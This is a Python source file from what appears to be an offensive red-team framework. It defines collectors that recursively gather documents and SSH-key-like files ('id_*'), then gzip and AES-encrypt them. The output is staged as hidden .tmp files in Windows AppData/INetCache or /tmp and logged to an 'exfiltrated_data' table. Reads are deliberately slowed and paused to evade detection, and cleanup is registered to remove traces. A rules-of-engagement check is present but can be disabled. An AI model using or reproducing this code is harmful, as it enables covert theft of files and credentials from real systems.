"""
forge/utils/post/collectors/filesystem.py
BaseCollector ABC + FilesystemCollector — Module 5-H.

BaseCollector defines the contract all collectors must satisfy.
FilesystemCollector performs recursive file collection with:
  - Per-file stagger delay (DEFAULT_STAGGER = 2.0 s)
  - 30 s pause per 100 files collected
  - In-memory gzip + AES-256-GCM encryption before staging
  - Metadata-only persistence (path, sha256, size — never content)
  - Staging to existing writable subdirectories (never new top-level dirs)

OPSEC:
  - File content NEVER logged, never written to audit_log or engagement DB.
  - Staging path registered with cleanup.py before first write.
  - Glob patterns validated against engagement scope where applicable.
"""

from __future__ import annotations

import abc
import gzip
import hashlib
import io
import json
import logging
import os
import sqlite3
import tarfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Generator, Optional
from forge.db.direct_connect import direct_connect  # noqa: E402  # PRAGMA-configured wrapper for bare sqlite3.connect

_LOG = logging.getLogger(__name__)

DEFAULT_STAGGER = 2.0  # seconds between file reads
PAUSE_INTERVAL = 100  # files between 30s pauses
PAUSE_DURATION = 30.0  # seconds


@dataclass
class ArtifactMetadata:
    """Common metadata model for all collection families."""

    artifact_family: str
    source_path: str
    source_platform: str
    collection_method: str
    artifact_subtype: Optional[str] = None
    confidence: float = 0.5
    encryption_state: str = "encrypted"
    redaction_state: str = "none"
    validation_state: str = "discovered"
    report_safe_summary_fields: dict = field(default_factory=dict)


@dataclass
class CollectedFile:
    """Metadata record for a single collected file. Content is NOT stored here."""

    path: str
    sha256: str
    size_bytes: int
    metadata: ArtifactMetadata
    compressed: bool = True
    encrypted: bool = True


# ── Abstract base ──────────────────────────────────────────────────────────────


class BaseCollector(abc.ABC):
    """
    Abstract base class for all Module 5-H data collectors.

    Subclasses must implement:
      collect() → Generator[CollectedFile, None, None]

    Subclasses must NOT:
      - Log file contents to any handler.
      - Write to the engagement DB beyond the metadata schema.
      - Create new top-level directories for staging.
    """

    def __init__(
        self,
        db_path: Path,
        engagement_id: int,
        session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
        staging_dir: Optional[Path] = None,
        stagger: float = DEFAULT_STAGGER,
    ) -> None:
        self._db_path = db_path
        self._engagement_id = engagement_id
        self._session_key = session_key
        self._key = bytes.fromhex(session_key) if len(session_key) == 64 else None
        self._staging_dir = staging_dir or self._default_staging_dir()
        self._stagger = stagger
        self._file_count = 0
        self._roe_id = None
        self._require_roe = True

    def __init_subclass__(cls, **kwargs) -> None:
        super().__init_subclass__(**kwargs)
        for method_name in ("discover", "collect"):
            method = cls.__dict__.get(method_name)
            if method is None or getattr(method, "_forge_roe_wrapped", False):
                continue
            setattr(cls, method_name, BaseCollector._wrap_authorized_method(method_name, method))

    @staticmethod
    def _wrap_authorized_method(method_name: str, method: Callable):
        def _wrapped(self, *args, **kwargs):
            self._require_local_collection_roe(method_name)
            return method(self, *args, **kwargs)

        _wrapped.__name__ = getattr(method, "__name__", method_name)
        _wrapped.__doc__ = getattr(method, "__doc__", None)
        _wrapped._forge_roe_wrapped = True
        return _wrapped

    def configure_execution(
        self,
        *,
        roe_id: str | None = None,
        require_roe: bool | None = None,
    ) -> "BaseCollector":
        if roe_id is not None:
            self._roe_id = " ".join(str(roe_id).strip().split())[:160]
        if require_roe is not None:
            self._require_roe = bool(require_roe)
        return self

    def _require_local_collection_roe(self, action_name: str) -> str | None:
        if not self._require_roe:
            return None
        normalized = " ".join(
            str(self._roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split()
        )[:160]
        if not normalized:
            raise RuntimeError(
                f"{self.__class__.__name__}.{action_name} requires roe_id or FORGE_ROE_ID "
                "before local collection."
            )
        self._roe_id = normalized
        return normalized

    @abc.abstractmethod
    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        """Yield ArtifactMetadata records for discovered artifacts."""
        ...

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        """Collect a single artifact."""
        return None

    def validate(self, artifact: CollectedFile) -> bool:
        """Validate a collected artifact."""
        artifact.metadata.validation_state = "skipped"
        return False

    def persist_metadata(self, record: CollectedFile) -> None:
        """Write metadata-only record to engagement DB. Content never stored here."""
        record.metadata.validation_state = self._next_validation_state(
            record.metadata.validation_state
        )
        summary_payload = self._build_report_safe_summary(record.metadata)
        try:
            con = direct_connect(self._db_path)
            con.execute(
                """INSERT OR IGNORE INTO exfiltrated_data
                   (engagement_id, file_path, sha256, size_bytes, collected_at,
                    artifact_family, artifact_subtype, source_platform, collection_method, confidence, report_safe_summary)
                   VALUES (?, ?, ?, ?, datetime('now'), ?, ?, ?, ?, ?, ?)""",
                (
                    self._engagement_id,
                    record.path,
                    record.sha256,
                    record.size_bytes,
                    record.metadata.artifact_family,
                    record.metadata.artifact_subtype,
                    record.metadata.source_platform,
                    record.metadata.collection_method,
                    record.metadata.confidence,
                    json.dumps(summary_payload),
                ),
            )
            con.commit()
            con.close()
        except sqlite3.OperationalError:
            pass

    def _compress_and_encrypt(self, data: bytes) -> bytes:
        """In-memory gzip + AES-256-GCM. No temp files written."""
        buf = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode="wb") as gz:
            gz.write(data)
        compressed = buf.getvalue()

        if not self._key:
            return compressed
        try:
            from Crypto.Cipher import AES
            from Crypto.Random import get_random_bytes

            nonce = get_random_bytes(12)
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            ct, tag = cipher.encrypt_and_digest(compressed)
            return nonce + tag + ct
        except ImportError:
            return compressed

    def _stagger_and_pause(self) -> None:
        """Enforce per-file delay and periodic 30 s pause."""
        self._file_count += 1
        time.sleep(self._stagger)
        if self._file_count % PAUSE_INTERVAL == 0:
            _LOG.debug("Stagger pause (%d files collected)", self._file_count)
            time.sleep(PAUSE_DURATION)

    @staticmethod
    def _sha256(data: bytes) -> str:
        return hashlib.sha256(data).hexdigest()

    @staticmethod
    def _default_staging_dir() -> Path:
        """
        Return an existing writable subdirectory.
        NEVER create new top-level directories.
        """
        candidates = [
            Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows",
            Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Windows" / "INetCache",
            Path("/var/tmp"),
            Path("/tmp"),
        ]
        for p in candidates:
            try:
                if p.exists() and os.access(p, os.W_OK):
                    return p
            except Exception:
                pass
        return Path("/tmp")

    @staticmethod
    def _register_cleanup(path: Path) -> None:
        try:
            from forge.shared.cleanup import register_cleanup_file

            register_cleanup_file(path)
        except ImportError:
            pass

    @staticmethod
    def _next_validation_state(current_state: str) -> str:
        if current_state in {"none", "discovered"}:
            return "collected"
        return current_state

    @staticmethod
    def _build_report_safe_summary(metadata: ArtifactMetadata) -> dict:
        summary_payload = dict(metadata.report_safe_summary_fields)
        summary_payload.setdefault(
            "collection_state",
            {
                "encryption_state": metadata.encryption_state,
                "redaction_state": metadata.redaction_state,
                "validation_state": metadata.validation_state,
            },
        )
        return summary_payload

    def _record_payload(
        self,
        artifact: ArtifactMetadata,
        raw_data: bytes,
        logical_path: str,
        ext: Optional[str] = None,
    ) -> CollectedFile:
        sha256 = self._sha256(raw_data)
        payload = self._compress_and_encrypt(raw_data)
        stage_ext = ext or artifact.artifact_subtype or "artifact"
        stage_path = self._staging_dir / f".{sha256[:16]}.{stage_ext}.tmp"
        stage_path.write_bytes(payload)
        self._register_cleanup(stage_path)

        record = CollectedFile(
            path=logical_path,
            sha256=sha256,
            size_bytes=len(payload),
            metadata=artifact,
        )
        self.persist_metadata(record)
        self._stagger_and_pause()
        return record

    def _archive_directory(self, directory: Path) -> tuple[bytes, dict]:
        entries: list[dict[str, object]] = []
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tar:
            for item in sorted(directory.rglob("*")):
                if not item.is_file():
                    continue
                try:
                    relative_path = item.relative_to(directory)
                    tar.add(item, arcname=str(relative_path))
                    entries.append(
                        {
                            "path": str(relative_path).replace("\\", "/"),
                            "size_bytes": item.stat().st_size,
                        }
                    )
                except (OSError, PermissionError):
                    continue
        summary = {
            "file_count": len(entries),
            "sample_entries": [entry["path"] for entry in entries[:25]],
        }
        return buf.getvalue(), summary


# ── Filesystem collector ───────────────────────────────────────────────────────


class FilesystemCollector(BaseCollector):
    """
    Recursive file collector with glob pattern filtering, stagger, and in-memory
    compression + encryption before staging.

    Args:
        root:     Root directory to walk.
        patterns: List of glob patterns (e.g. ['*.docx', '*.xlsx', 'id_*']).
        max_size: Maximum file size in bytes (default: 50 MB).
    """

    def __init__(
        self,
        db_path: Path,
        engagement_id: int,
        root: Path,
        patterns: Optional[list[str]] = None,
        max_size: int = 50 * 1024 * 1024,
        session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
        staging_dir: Optional[Path] = None,
        stagger: float = DEFAULT_STAGGER,
    ) -> None:
        super().__init__(db_path, engagement_id, session_key, staging_dir, stagger)
        self._root = root
        self._patterns = patterns or ["*.docx", "*.xlsx", "*.pdf", "*.txt", "*.csv"]
        self._max_size = max_size

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        import fnmatch

        _LOG.info("FilesystemCollector: scanning %s (patterns=%s)", self._root, self._patterns)

        for dirpath, _, filenames in os.walk(self._root):
            for fname in filenames:
                full = Path(dirpath) / fname
                if not any(fnmatch.fnmatch(fname, p) for p in self._patterns):
                    continue
                try:
                    stat = full.stat()
                    if stat.st_size > self._max_size:
                        _LOG.debug("Skipping oversized file: %s (%d bytes)", full, stat.st_size)
                        continue

                    yield ArtifactMetadata(
                        artifact_family="filesystem",
                        artifact_subtype=full.suffix.strip("."),
                        source_path=str(full),
                        source_platform=os.name,
                        collection_method="file_read",
                    )

                except PermissionError:
                    _LOG.debug("Permission denied (stat): %s", full)
                except Exception as exc:
                    _LOG.debug("Discovery error (%s): %s", full, exc)

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        full = Path(artifact.source_path)
        try:
            data = full.read_bytes()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)

            # Write encrypted chunk to staging dir (existing writable path)
            chunk_name = f".{sha256[:16]}.tmp"
            stage_path = self._staging_dir / chunk_name
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(full),
                sha256=sha256,
                size_bytes=len(data),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", full)
        except Exception as exc:
            _LOG.debug("Collection error (%s): %s", full, exc)
        return None
